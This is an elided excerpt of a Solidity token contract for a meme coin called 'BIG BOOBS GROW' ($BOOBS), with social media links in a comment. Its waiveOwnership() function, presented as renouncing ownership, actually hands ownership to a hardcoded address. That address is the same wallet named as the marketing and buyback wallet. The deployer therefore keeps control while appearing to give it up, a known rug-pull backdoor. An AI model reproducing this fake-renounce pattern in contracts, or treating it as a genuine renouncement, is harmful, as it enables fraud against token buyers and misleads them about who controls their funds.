...
/*
https:https://t.me/BigBoobsGrow
https://twitter.com/BigBoobsGrow
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = 0x644873a24951289D323fBa3716ff00F036aA125c;
    }
...
contract BOOBS is Context, IERC20, Ownable {
    ...
    string private _name = "BIG BOOBS GROW";
    string private _symbol = "$BOOBS";
    uint8 private _decimals = 9;

    address payable public MarketingWallet = payable(0x644873a24951289D323fBa3716ff00F036aA125c); // Marketing Address SM
    address payable public BuyBackWallet = payable(0x644873a24951289D323fBa3716ff00F036aA125c); // Team Address
